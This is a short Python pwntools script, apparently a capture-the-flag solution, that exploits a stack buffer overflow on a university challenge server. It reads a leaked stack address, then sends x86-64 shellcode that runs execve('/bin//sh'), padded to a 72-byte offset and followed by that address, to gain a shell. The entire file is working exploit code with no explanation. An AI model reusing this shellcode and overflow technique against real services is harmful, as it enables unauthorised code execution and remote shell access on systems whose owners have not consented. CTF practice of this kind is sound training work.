from pwn import p64, remote, process

r = remote('cyberchallenge.disi.unitn.it', 9003)
# r = process('./bin')


shellcode =  b"\x48\x31\xd2"
shellcode += b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
shellcode += b"\x48\xc1\xeb\x08"
shellcode += b"\x53"
shellcode += b"\x48\x89\xe7"
shellcode += b"\x50"
shellcode += b"\x57"
shellcode += b"\x48\x89\xe6"
shellcode += b"\xb0\x3b"
shellcode += b"\x0f\x05"

offset = 72

r.recvline()
r.recvuntil(b'stored at ')
win_addr = int(r.recvline().strip(), 16)

r.sendline(shellcode + b'A' * (offset - len(shellcode)) + p64(win_addr))

res = r.recvall(timeout=1)
print(res.decode(errors='ignore'))
